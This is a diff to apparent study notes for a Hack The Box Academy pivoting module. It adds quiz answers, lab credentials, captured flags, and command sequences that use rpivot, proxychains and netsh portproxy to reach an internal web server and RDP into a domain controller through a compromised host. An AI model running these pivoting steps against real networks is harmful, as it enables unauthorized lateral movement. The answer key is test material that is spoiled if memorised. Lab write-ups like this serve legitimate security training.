@@ -2650,7 +2650,6 @@ Results: tun0
 Results: 178.62.64.1
 
 
-
 ### Choosing The Dig Site & Starting Our Tunnels
 
 SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
@@ -2764,15 +2763,72 @@ Results: 172.16.5.19,172.16.5.129
 
 Results: 172.16.5.0/255.255.254.0 via 10.129.202.64
 
+### Playing Pong with Socat
+
+**SSH tunneling is required with Socat. True or False?**
+
+Results: False
 
 
-Question
+**What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)**
+
+Results: windows/x64/meterpreter/bind_tcp
+
+
+###  Pivoting Around Obstacles
+
+**From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**
+
+Results: Attack Host
+
+
+**From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**
+
+Results: Pivot Host
+
+
+**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**
 
 ```
+# Kali, terminal 1, copy the rpivot folder and run the server 
+scp -r rpivot ubuntu@$UbuntuIP:/home/ubuntu/
+cd rpivot/ 
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 
+# Kali, terminal 2, connect to the ubuntu machine and run the rpivot client
+ssh ubuntu@$ip
+cd rpivot/
+python2.7 client.py --server-ip $KaliIP --server-port 9999
+
+# Kali, terminal 3, edit proxychains4.conf file and add the line ' sock4 127.0.0.1 9050' at the last line
+sudo nano /etc/proxychains4.conf  
+
+# Kali, terminal 3, connect to the internal web server:
+proxychains firefox-esr $ipWebServer
 ```
 
-Results:
+Results: I_L0v3_Pr0xy_Ch@ins
+
+
+RDP to $ip  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
+
+```
+# From kali, terminal 1, connect to the windows machine
+xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ipWindows
+
+# Run Powershell as Administrator and execute:
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1Windows connectport=3389 connectaddress=$IpInterface2Windows
+
+# Make sure the connection is saved
+netsh.exe interface portproxy show v4tov4
+
+# From kali, terminal 2, connect to the Target:
+xfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080
+
+# Browse to the file and capture the flag
+```
+
+Results: Jim Flipflop
 
 
 
